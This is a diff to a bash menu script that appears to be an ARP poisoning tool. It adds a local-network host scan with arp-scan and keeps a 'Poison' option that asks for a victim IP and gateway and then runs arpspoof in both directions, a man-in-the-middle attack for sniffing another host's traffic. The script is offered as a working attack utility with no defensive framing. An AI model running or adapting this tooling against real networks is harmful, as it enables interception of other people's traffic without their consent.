@@ -57,6 +57,9 @@ echo -e "${Green}${bold}Checking the requirements...${NC}${normal}";
   kill "$!"
   clear
  echo -e "${Green}${bold}Upgrading Net-Tools...${NC}${normal}";
+ sleep 1
+ echo
+ echo -e "${Green}${bold}Downloading Sniffing Tools...${NC}${normal}";
 
   chmod +x ./requirements.sh
  sudo xterm ./requirements.sh
@@ -73,6 +76,7 @@ spinner&
 }
 #Print Net-Stats----------------------------------------------------------
 netstats() {
+ printf "${Purple}"
  echo
  echo
  echo -e "${bold}----[Net-Stats]----"
@@ -87,7 +91,8 @@ netstats() {
 
  IP=$(/sbin/ip route | awk '/default/ { print $3 }')
  echo "Default Gateway : $IP ${normal}"
-echo
+ 
+
 echo
 }
 
@@ -117,7 +122,7 @@ main() {
 #Menu---------------------------------------------
 printf "${Purple}${bold}"
 PS3=': '
-options=("Poison" "Arp Table" "Quit")
+options=("Poison" "Arp Table" "Hosts Scan" "Quit")
 select opt in "${options[@]}"
 do
     case $opt in
@@ -138,7 +143,9 @@ do
          read -p 'Victim IP: ' vict
          echo
          read -p 'Default Gateway: ' gate
-         sudo xterm -e arpspoof -i $inter -t $vict -r $gate &sudo xterm -e arpspoof -i $inter -t $gate -r $vict
+         echo
+         echo "Stop sniffing...U addicted as hell!"
+         sudo xterm -e arpspoof -i $inter -t $vict -r $gate &sudo xterm -e arpspoof -i $inter -t $gate -r $vict 
          wait
          echo
          backmenu
@@ -164,6 +171,27 @@ do
          backmenu
          
             ;;
+
+        "Hosts Scan")
+            clear
+            echo -e "${Purple}${bold}Scanning for Hosts...${normal}";
+
+            echo
+         spinner&
+	 sleep 2
+	 kill "$!"
+         clear
+         ./banner.sh
+         netstats
+         printf "${Purple}${bold}"
+         read -p 'Interface (eth0 - wlan0): ' scanint
+         echo
+         sudo arp-scan --interface=$scanint --localnet
+         echo
+         wait
+         echo
+         backmenu
+           ;;
 
         "Quit")
             clear
